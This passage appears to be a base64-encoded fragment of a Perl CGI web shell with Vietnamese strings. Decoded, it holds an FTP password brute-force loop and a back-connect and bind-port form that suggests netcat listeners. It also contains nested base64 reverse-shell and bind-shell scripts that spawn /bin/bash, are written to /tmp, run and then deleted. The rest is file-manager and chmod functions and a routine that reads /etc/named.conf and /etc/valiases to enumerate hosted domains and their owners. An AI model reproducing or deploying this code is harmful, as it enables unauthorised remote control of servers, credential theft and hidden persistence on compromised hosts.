CRwYXNzd29yZCAoQHBhc3MpCgkJCQl7CgkJCQkJJGZ0cCA9IE5ldDo6RlRQLT5uZXcoJFNlcnZlcikgb3IgZGllICJDb3VsZCBub3QgY29ubmVjdCB0byAkU2VydmVyTmFtZVxuIjsgCgkJCQkJaWYoJGZ0cC0+bG9naW4oIiR1c2VybmFtZSIsIiRwYXNzd29yZCIpKQoJCQkJCXsKCQkJCQkJJHJlc3VsdCAuPSAiPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9J2Z0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXInPlsrXSBmdHA6Ly8kdXNlcm5hbWU6JHBhc3N3b3JkXEAkU2VydmVyPC9hPjxicj5cbiI7CgkJCQkJCSRmdHAtPnF1aXQoKTsKCQkJCQkJYnJlYWs7CgkJCQkJfQoJCQkJCWlmKCEoJGlueydzbGVlcCd9IGVxICIwIikpCgkJCQkJewoJCQkJCQlzbGVlcChpbnQoJGlueydzbGVlcCd9KSk7CgkJCQkJfQoJCQkJCSRmdHAtPnF1aXQoKTsKCQkJCX0KCQkJfQoJCX0KCQkkcmVzdWx0IC49ICJcbjxicj49PT09PT09PT09Pj4+Pj4+Pj4+PiBGaW5pc2hlZCA8PDw8PDw8PDw8PT09PT09PT09PTxicj5cbiI7Cgl9CglyZXR1cm4gJHJlc3VsdDsKfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgQmFja2Nvbm5lY3QgRm9ybQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBCYWNrQmluZEZvcm0KewoJcmV0dXJuIDw8RU5EOwoJPGJyPjxicj4KCgk8dGFibGU+Cgk8dHI+Cgk8Zm9ybSBuYW1lPSJmIiBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KCTx0ZD5CYWNrQ29ubmVjdDogPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJhY2tiaW5kIj48L3RkPgoJPHRkPiBIb3N0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMjAiIG5hbWU9ImNsaWVudGFkZHIiIHZhbHVlPSIkRU5WeydSRU1PVEVfQUREUid9Ij4KCSBQb3J0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNyIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjgwIiBvbmtleXVwPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYmEnKS5pbm5lckhUTUw9dGhpcy52YWx1ZTsiPjwvdGQ+CgoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkNvbm5lY3QiPjwvdGQ+Cgk8L2Zvcm0+Cgk8L3RyPgoJPHRyPgoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDbGllbnQgbGlzdGVuIGJlZm9yZSBjb25uZWN0IGJhY2shCgk8YnI+WytdIFRyeSBjaGVjayB5b3VyIFBvcnQgd2l0aCA8YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cDovL3d3dy5jYW55b3VzZWVtZS5vcmcvIj5odHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy88L2E+Cgk8YnI+WytdIENsaWVudCBsaXN0ZW4gd2l0aCBjb21tYW5kOiA8cnVuPm5jIC12diAtbCAtcCA8c3BhbiBpZD0iYmEiPjgwPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPgoKCTwvdHI+Cgk8L3RhYmxlPgoKCTxicj48YnI+Cgk8dGFibGU+Cgk8dHI+Cgk8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4KCTx0ZD5CaW5kIFBvcnQ6IDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJiYWNrYmluZCI+PC90ZD4KCgk8dGQ+IFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxNSIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjE0MTIiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiaScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+CgoJIFBhc3N3b3JkOiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMTUiIG5hbWU9ImJpbmRwYXNzIiB2YWx1ZT0iVEhJRVVHSUFCVU9OIj48L3RkPgoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkJpbmQiPjwvdGQ+Cgk8L2Zvcm0+Cgk8L3RyPgoJPHRyPgoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDaHVjIG5hbmcgY2h1YSBkYyB0ZXN0IQoJPGJyPlsrXSBUcnkgY29tbWFuZDogPHJ1bj5uYyAkRU5WeydTRVJWRVJfQUREUid9IDxzcGFuIGlkPSJiaSI+MTQxMjwvc3Bhbj48L3J1bj48L2ZvbnQ+PC90ZD4KCgk8L3RyPgoJPC90YWJsZT48YnI+CkVORAp9CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBCYWNrY29ubmVjdCB1c2UgcGVybAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBCYWNrQmluZAp7Cgl1c2UgTUlNRTo6QmFzZTY0OwoJdXNlIFNvY2tldDsJCgkkYmFja3Blcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdTVTg2T2xOdlkydGxkRHNOQ2lSVGFHVnNiQWs5SUNJdlltbHVMMkpoYzJnaU93MEtKRUZTUjBNOVFFRlNSMVk3RFFwMWMyVWdVMjlqYTJWME93MEtkWE5sSUVacGJHVklZVzVrYkdVN0RRcHpiMk5yWlhRb1UwOURTMFZVTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2daMlYwY0hKdmRHOWllVzVoYldVb0luUmpjQ0lwS1NCdmNpQmthV1VnY0hKcGJuUWdJbHN0WFNCVmJtRmliR1VnZEc4Z1VtVnpiMngyWlNCSWIzTjBYRzRpT3cwS1kyOXVibVZqZENoVFQwTkxSVlFzSUhOdlkydGhaR1J5WDJsdUtDUkJVa2RXV3pGZExDQnBibVYwWDJGMGIyNG9KRUZTUjFaYk1GMHBLU2tnYjNJZ1pHbGxJSEJ5YVc1MElDSmJMVjBnVlc1aFlteGxJSFJ2SUVOdmJtNWxZM1FnU0c5emRGeHVJanNOQ25CeWFXNTBJQ0pEYjI1dVpXTjBaV1FoSWpzTkNsTlBRMHRGVkMwK1lYVjBiMlpzZFhOb0tDazdEUXB2Y0dWdUtGTlVSRWxPTENBaVBpWlRUME5MUlZRaUtUc05DbTl3Wlc0b1UxUkVUMVZVTENJK0psTlBRMHRGVkNJcE93MEtiM0JsYmloVFZFUkZVbElzSWo0bVUwOURTMFZVSWlrN0RRcHdjbWx1ZENBaUxTMDlQU0JEYjI1dVpXTjBaV1FnUW1GamEyUnZiM0lnUFQwdExTQWdYRzVjYmlJN0RRcHplWE4wWlcwb0luVnVjMlYwSUVoSlUxUkdTVXhGT3lCMWJuTmxkQ0JUUVZaRlNFbFRWQ0E3WldOb2J5QW5XeXRkSUZONWMzUmxiV2x1Wm04NklDYzdJSFZ1WVcxbElDMWhPMlZqYUc4N1pXTm9ieUFuV3l0ZElGVnpaWEpwYm1adk9pQW5PeUJwWkR0bFkyaHZPMlZqYUc4Z0oxc3JYU0JFYVhKbFkzUnZjbms2SUNjN0lIQjNaRHRsWTJodk95QmxZMmh2SUNkYksxMGdVMmhsYkd3NklDYzdKRk5vWld4c0lpazdEUXBqYkc5elpTQlRUME5MUlZRNyI7CgkkYmluZHBlcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdVMjlqYTJWME93MEtKRUZTUjBNOVFFRlNSMVk3RFFva2NHOXlkQWs5SUNSQlVrZFdXekJkT3cwS0pIQnliM1J2Q1QwZ1oyVjBjSEp2ZEc5aWVXNWhiV1VvSjNSamNDY3BPdzBLSkZOb1pXeHNDVDBnSWk5aWFXNHZZbUZ6YUNJN0RRcHpiMk5yWlhRb1UwVlNWa1ZTTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2dKSEJ5YjNSdktXOXlJR1JwWlNBaWMyOWphMlYwT2lRaElqc05Dbk5sZEhOdlkydHZjSFFvVTBWU1ZrVlNMQ0JUVDB4ZlUwOURTMFZVTENCVFQxOVNSVlZUUlVGRVJGSXNJSEJoWTJzb0ltd2lMQ0F4S1NsdmNpQmthV1VnSW5ObGRITnZZMnR2Y0hRNklDUWhJanNOQ21KcGJtUW9VMFZTVmtWU0xDQnpiMk5yWVdSa2NsOXBiaWdrY0c5eWRDd2dTVTVCUkVSU1gwRk9XU2twYjNJZ1pHbGxJQ0ppYVc1a09pQWtJU0k3RFFwc2FYTjBaVzRvVTBWU1ZrVlNMQ0JUVDAxQldFTlBUazRwQ1FsdmNpQmthV1VnSW14cGMzUmxiam9nSkNFaU93MEtabTl5S0RzZ0pIQmhaR1J5SUQwZ1lXTmpaWEIwS0VOTVNVVk9WQ3dnVTBWU1ZrVlNLVHNnWTJ4dmMyVWdRMHhKUlU1VUtRMEtldzBLQ1c5d1pXNG9VMVJFU1U0c0lDSStKa05NU1VWT1ZDSXBPdzBLQ1c5d1pXNG9VMVJFVDFWVUxDQWlQaVpEVEVsRlRsUWlLVHNOQ2dsdmNHVnVLRk5VUkVWU1Vpd2dJajRtUTB4SlJVNVVJaWs3RFFvSmMzbHpkR1Z0S0NKMWJuTmxkQ0JJU1ZOVVJrbE1SVHNnZFc1elpYUWdVMEZXUlVoSlUxUWdPMlZqYUc4Z0oxc3JYU0JUZVhOMFpXMXBibVp2T2lBbk95QjFibUZ0WlNBdFlUdGxZMmh2TzJWamFHOGdKMXNyWFNCVmMyVnlhVzVtYnpvZ0p6c2dhV1E3WldOb2J6dGxZMmh2SUNkYksxMGdSR2x5WldOMGIzSjVPaUFuT3lCd2QyUTdaV05vYnpzZ1pXTm9ieUFuV3l0ZElGTm9aV3hzT2lBbk95UlRhR1ZzYkNJcE93MEtDV05zYjNObEtGTlVSRWxPS1RzTkNnbGpiRzl6WlNoVFZFUlBWVlFwT3cwS0NXTnNiM05sS0ZOVVJFVlNVaWs3RFFwOURRbz0iOwoKCSRDbGllbnRBZGRyID0gJGlueydjbGllbnRhZGRyJ307CgkkQ2xpZW50UG9ydCA9IGludCgkaW57J2NsaWVudHBvcnQnfSk7CglpZigkQ2xpZW50UG9ydCBlcSAwKQoJewoJCXJldHVybiAmQmFja0JpbmRGb3JtOwoJfWVsc2lmKCEkQ2xpZW50QWRkciBlcSAiIikKCXsKCQkkRGF0YT1kZWNvZGVfYmFzZTY0KCRiYWNrcGVybCk7CgkJaWYoLXcgIi90bXAvIikKCQl7CgkJCSRGaWxlPSIvdG1wL2JhY2tjb25uZWN0LnBsIjsJCgkJfWVsc2UKCQl7CgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiYWNrY29ubmVjdC5wbCI7CgkJfQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOwoJCXByaW50IEZJTEUgJERhdGE7CgkJY2xvc2UgRklMRTsKCQlzeXN0ZW0oInBlcmwgYmFja2Nvbm5lY3QucGwgJENsaWVudEFkZHIgJENsaWVudFBvcnQiKTsKCQl1bmxpbmsoJEZpbGUpOwoJCWV4aXQgMDsKCX1lbHNlCgl7CgkJJERhdGE9ZGVjb2RlX2Jhc2U2NCgkYmluZHBlcmwpOwoJCWlmKC13ICIvdG1wIikKCQl7CgkJCSRGaWxlPSIvdG1wL2JpbmRwb3J0LnBsIjsJCgkJfWVsc2UKCQl7CgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiaW5kcG9ydC5wbCI7CgkJfQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOwoJCXByaW50IEZJTEUgJERhdGE7CgkJY2xvc2UgRklMRTsKCQlzeXN0ZW0oInBlcmwgYmluZHBvcnQucGwgJENsaWVudFBvcnQiKTsKCQl1bmxpbmsoJEZpbGUpOwoJCWV4aXQgMDsKCX0KfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgIEFycmF5IExpc3QgRGlyZWN0b3J5CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJtRGlyKCQpIAp7CglteSAkZGlyID0gc2hpZnQ7CiAgICBpZihvcGVuZGlyKERJUiwkZGlyKSkKCXsKCQl3aGlsZSgkZmlsZSA9IHJlYWRkaXIoRElSKSkKCQl7CgkJCWlmKCgkZmlsZSBuZSAiLiIpICYmICgkZmlsZSBuZSAiLi4iKSkKCQkJewoJCQkJJGZpbGU9ICRkaXIuJFBhdGhTZXAuJGZpbGU7CgkJCQlpZigtZCAkZmlsZSkKCQkJCXsKCQkJCQkmUm1EaXIoJGZpbGUpOwoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCXVubGluaygkZmlsZSk7CgkJCQl9CgkJCX0KCQl9CgkJY2xvc2VkaXIoRElSKTsKCX0KCWlmKCFybWRpcigkZGlyKSkKCXsKCQkKCX0KfQpzdWIgRmlsZU93bmVyKCQpCnsKCW15ICRmaWxlID0gc2hpZnQ7CglpZigtZSAkZmlsZSkKCXsKCQkoJHVpZCwkZ2lkKSA9IChzdGF0KCRmaWxlKSlbNCw1XTsKCQlpZigkV2luTlQpCgkJewoJCQlyZXR1cm4gIj8/PyI7CgkJfQoJCWVsc2UKCQl7CgkJCSRuYW1lPWdldHB3dWlkKCR1aWQpOwoJCQkkZ3JvdXA9Z2V0Z3JnaWQoJGdpZCk7CgkJCXJldHVybiAkbmFtZS4iLyIuJGdyb3VwOwoJCX0KCX0KCXJldHVybiAiPz8/IjsKfQpzdWIgUGFyZW50Rm9sZGVyKCQpCnsKCW15ICRwYXRoID0gc2hpZnQ7CglteSAkQ29tbSA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkIC4uIi4kQ21kU2VwLiRDbWRQd2Q7CgljaG9wKCRwYXRoID0gYCRDb21tYCk7CglyZXR1cm4gJHBhdGg7Cn0Kc3ViIEZpbGVQZXJtcygkKQp7CglteSAkZmlsZSA9IHNoaWZ0OwoJbXkgJHVyID0gIi0iOwoJbXkgJHV3ID0gIi0iOwoJaWYoLWUgJGZpbGUpCgl7CgkJaWYoJFdpbk5UKQoJCXsKCQkJaWYoLXIgJGZpbGUpeyAkdXIgPSAiciI7IH0KCQkJaWYoLXcgJGZpbGUpeyAkdXcgPSAidyI7IH0KCQkJcmV0dXJuICR1ciAuICIgLyAiIC4gJHV3OwoJCX1lbHNlCgkJewoJCQkkbW9kZT0oc3RhdCgkZmlsZSkpWzJdOwoJCQkkcmVzdWx0ID0gc3ByaW50ZigiJTA0byIsICRtb2RlICYgMDc3NzcpOwoJCQlyZXR1cm4gJHJlc3VsdDsKCQl9Cgl9CglyZXR1cm4gIjAwMDAiOwp9CnN1YiBGaWxlTGFzdE1vZGlmaWVkKCQpCnsKCW15ICRmaWxlID0gc2hpZnQ7CglpZigtZSAkZmlsZSkKCXsKCQkoJGxhKSA9IChzdGF0KCRmaWxlKSlbOV07CgkJKCRkLCRtLCR5LCRoLCRpKSA9IChsb2NhbHRpbWUoJGxhKSlbMyw0LDUsMiwxXTsKCQkkeSA9ICR5ICsgMTkwMDsKCQlAbW9udGggPSBxdy8xIDIgMyA0IDUgNiA3IDggOSAxMCAxMSAxMi87CgkJJGxtdGltZSA9IHNwcmludGYoIiUwMmQvJXMvJTRkICUwMmQ6JTAyZCIsJGQsJG1vbnRoWyRtXSwkeSwkaCwkaSk7CgkJcmV0dXJuICRsbXRpbWU7Cgl9CglyZXR1cm4gIj8/PyI7Cn0Kc3ViIEZpbGVTaXplKCQpCnsKCW15ICRmaWxlID0gc2hpZnQ7CglpZigtZiAkZmlsZSkKCXsKCQlyZXR1cm4gLXMgJGZpbGU7Cgl9CglyZXR1cm4gIjAiOwoKfQpzdWIgUGFyc2VGaWxlU2l6ZSgkKQp7CglteSAkc2l6ZSA9IHNoaWZ0OwoJaWYoJHNpemUgPD0gMTAyNCkKCXsKCQlyZXR1cm4gJHNpemUuICIgQiI7Cgl9CgllbHNlCgl7CgkJaWYoJHNpemUgPD0gMTAyNCoxMDI0KSAKCQl7CgkJCSRzaXplID0gc3ByaW50ZigiJS4wMmYiLCRzaXplIC8gMTAyNCk7CgkJCXJldHVybiAkc2l6ZS4iIEtCIjsKCQl9CgkJZWxzZSAKCQl7CgkJCSRzaXplID0gc3ByaW50ZigiJS4yZiIsJHNpemUgLyAxMDI0IC8gMTAyNCk7CgkJCXJldHVybiAkc2l6ZS4iIE1CIjsKCQl9Cgl9Cn0Kc3ViIHRyaW0oJCkKewoJbXkgJHN0cmluZyA9IHNoaWZ0OwoJJHN0cmluZyA9fiBzL15ccysvLzsKCSRzdHJpbmcgPX4gcy9ccyskLy87CglyZXR1cm4gJHN0cmluZzsKfQpzdWIgQWRkU2xhc2hlcygkKQp7CglteSAkc3RyaW5nID0gc2hpZnQ7Cgkkc3RyaW5nPX4gcy9cXC9cXFxcL2c7CglyZXR1cm4gJHN0cmluZzsKfQpzdWIgTGlzdERpcgp7CglteSAkcGF0aCA9ICRDdXJyZW50RGlyLiRQYXRoU2VwOwoJJHBhdGg9fiBzL1xcXFwvXFwvZzsKCW15ICRyZXN1bHQgPSAiPGZvcm0gbmFtZT0nZicgYWN0aW9uPSckU2NyaXB0TG9jYXRpb24nPjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+UGF0aDogWyAiLiZBZGRMaW5rRGlyKCJndWkiKS4iIF0gPC9zcGFuPjxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdkJyBzaXplPSc0MCcgdmFsdWU9JyRDdXJyZW50RGlyJyAvPjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2EnIHZhbHVlPSdndWknPjxpbnB1dCBjbGFzcz0nc3VibWl0JyB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDaGFuZ2UnPjwvZm9ybT4iOwoJaWYoLWQgJHBhdGgpCgl7CgkJbXkgQGZuYW1lID0gKCk7CgkJbXkgQGRuYW1lID0gKCk7CgkJaWYob3BlbmRpcihESVIsJHBhdGgpKQoJCXsKCQkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpCgkJCXsKCQkJCSRmPSRwYXRoLiRmaWxlOwoJCQkJaWYoLWQgJGYpCgkJCQl7CgkJCQkJcHVzaChAZG5hbWUsJGZpbGUpOwoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCXB1c2goQGZuYW1lLCRmaWxlKTsKCQkJCX0KCQkJfQoJCQljbG9zZWRpcihESVIpOwoJCX0KCQlAZm5hbWUgPSBzb3J0IHsgbGMoJGEpIGNtcCBsYygkYikgfSBAZm5hbWU7CgkJQGRuYW1lID0gc29ydCB7IGxjKCRhKSBjbXAgbGMoJGIpIH0gQGRuYW1lOwoJCSRyZXN1bHQgLj0gIjxkaXY+PHRhYmxlIHdpZHRoPSc5MCUnIGNsYXNzPSdsaXN0ZGlyJz4KCgkJPHRyIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiAjM2UzZTNlJz48dGg+RmlsZSBOYW1lPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjEwMHB4Oyc+RmlsZSBTaXplPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+T3duZXI8L3RoPgoJCTx0aCBzdHlsZT0nd2lkdGg6MTAwcHg7Jz5QZXJtaXNzaW9uPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+TGFzdCBNb2RpZmllZDwvdGg+CgkJPHRoIHN0eWxlPSd3aWR0aDoyNjBweDsnPkFjdGlvbjwvdGg+PC90cj4iOwoJCW15ICRzdHlsZT0ibGluZSI7CgkJbXkgJGk9MDsKCQlmb3JlYWNoIG15ICRkIChAZG5hbWUpCgkJewoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOwoJCQkkZCA9ICZ0cmltKCRkKTsKCQkJJGRpcm5hbWU9JGQ7CgkJCWlmKCRkIGVxICIuLiIpIAoJCQl7CgkJCQkkZCA9ICZQYXJlbnRGb2xkZXIoJHBhdGgpOwoJCQl9CgkJCWVsc2lmKCRkIGVxICIuIikgCgkJCXsKCQkJCSRkID0gJHBhdGg7CgkJCX0KCQkJZWxzZSAKCQkJewoJCQkJJGQgPSAkcGF0aC4kZDsKCQkJfQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+CgoJCQk8dGQgaWQ9J0ZpbGVfJGknIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+PGEgIGhyZWY9Jz9hPWd1aSZkPSIuJGQuIic+WyAiLiRkaXJuYW1lLiIgXTwvYT48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZD5ESVI8L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlT3duZXIoJGQpLiI8L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZCBpZD0nRmlsZVBlcm1zXyRpJyBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7JyBvbmRibGNsaWNrPVwicm1fY2htb2RfZm9ybSh0aGlzLCIuJGkuIiwnIi4mRmlsZVBlcm1zKCRkKS4iJywnIi4kZGlybmFtZS4iJylcIiA+PHNwYW4gb25jbGljaz1cImNobW9kX2Zvcm0oIi4kaS4iLCciLiRkaXJuYW1lLiInKVwiID4iLiZGaWxlUGVybXMoJGQpLiI8L3NwYW4+PC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZCkuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZGlybmFtZScsJyIuJkFkZFNsYXNoZXMoJkFkZFNsYXNoZXMoJGQpKS4iJylcIj5SZW5hbWU8L2E+ICB8IDxhIG9uY2xpY2s9XCJpZighY29uZmlybSgnUmVtb3ZlIGRpcjogJGRpcm5hbWUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9JHBhdGgmcmVtb3ZlPSRkaXJuYW1lJz5SZW1vdmU8L2E+PC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8L3RyPiI7CgkJCSRpKys7CgkJfQoJCWZvcmVhY2ggbXkgJGYgKEBmbmFtZSkKCQl7CgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7CgkJCSRmaWxlPSRmOwoJCQkkZiA9ICRwYXRoLiRmOwoJCQkkdmlldyA9ICI/ZGlyPSIuJHBhdGguIiZ2aWV3PSIuJGY7CgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz48dGQgaWQ9J0ZpbGVfJGknIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7Jz48YSBocmVmPSc/YT1jb21tYW5kJmQ9Ii4kcGF0aC4iJmM9ZWRpdCUyMCIuJGZpbGUuIic+Ii4kZmlsZS4iPC9hPjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkPiIuJlBhcnNlRmlsZVNpemUoJkZpbGVTaXplKCRmKSkuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPiIuJkZpbGVPd25lcigkZikuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIGlkPSdGaWxlUGVybXNfJGknIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnIG9uZGJsY2xpY2s9XCJybV9jaG1vZF9mb3JtKHRoaXMsIi4kaS4iLCciLiZGaWxlUGVybXMoJGYpLiInLCciLiRmaWxlLiInKVwiID48c3BhbiBvbmNsaWNrPVwiY2htb2RfZm9ybSgkaSwnJGZpbGUnKVwiID4iLiZGaWxlUGVybXMoJGYpLiI8L3NwYW4+PC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZikuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0iLiRwYXRoLiImYz1lZGl0JTIwIi4kZmlsZS4iJz5FZGl0PC9hPiB8IDxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZmlsZScsJ2YnKVwiPlJlbmFtZTwvYT4gfCA8YSBocmVmPSc/YT1kb3dubG9hZCZvPWdvJmY9Ii4kZi4iJz5Eb3dubG9hZDwvYT4gfCA8YSBvbmNsaWNrPVwiaWYoIWNvbmZpcm0oJ1JlbW92ZSBmaWxlOiAkZmlsZSA/JykpIHsgcmV0dXJuIGZhbHNlO31cIiBocmVmPSc/YT1ndWkmZD0kcGF0aCZyZW1vdmU9JGZpbGUnPlJlbW92ZTwvYT48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsKCQkJJGkrKzsKCQl9CgkJJHJlc3VsdCAuPSAiPC90YWJsZT48L2Rpdj4iOwoJfQoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRyeSB0byBWaWV3IExpc3QgVXNlcgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBWaWV3RG9tYWluVXNlcgp7CglvcGVuIChkb21haW5zLCAnL2V0Yy9uYW1lZC5jb25mJykgb3IgJGVycj0xOwoJbXkgQGNuenMgPSA8ZG9tYWlucz47CgljbG9zZSBkMG1haW5zOwoJbXkgJHN0eWxlPSJsaW5lIjsKCW15ICRyZXN1bHQ9IjxoNT48Zm9udCBzdHlsZT0nZm9udDogMTVwdCBWZXJkYW5hO2NvbG9yOiAjZmY5OTAwOyc+SG9hbmcgU2EgLSBUcnVvbmcgU2E8L2ZvbnQ+PC9oNT4iOwoJaWYgKCRlcnIpCgl7CgkJJHJlc3VsdCAuPSAgKCc8cD5DMHVsZG5cJ3QgQnlwYXNzIGl0ICwgU29ycnk8L3A+Jyk7CgkJcmV0dXJuICRyZXN1bHQ7Cgl9ZWxzZQoJewoJCSRyZXN1bHQgLj0gJzx0YWJsZT48dHI+PHRoPkRvbWFpbnM8L3RoPiA8dGg+VXNlcjwvdGg+PC90cj4nOwoJfQoJZm9yZWFjaCBteSAkb25lIChAY256cykKCXsKCQlpZigkb25lID1+IG0vLio/em9uZSAiKC4qPykiIHsvKQoJCXsJCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7CgkJCSRmaWxlbmFtZT0gIi9ldGMvdmFsaWFzZXMvIi4kb25lOwoJCQkkb3duZXIgPSBnZXRwd3VpZCgoc3RhdCgkZmlsZW5hbWUpKVs0XSk7CgkJCSRyZXN1bHQgLj0gJzx0ciBjbGFzcz0iJHN0eWxlIiB3aWR0aD01MCU+PHRkPicuJG9uZS4nIDwvdGQ+PHRkPiAnLiRvd25lci4nPC90ZD48L3RyPic7CgkJfQoJfQoJJHJlc3VsdCAuPSAnPC90YWJsZT4nOwoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tL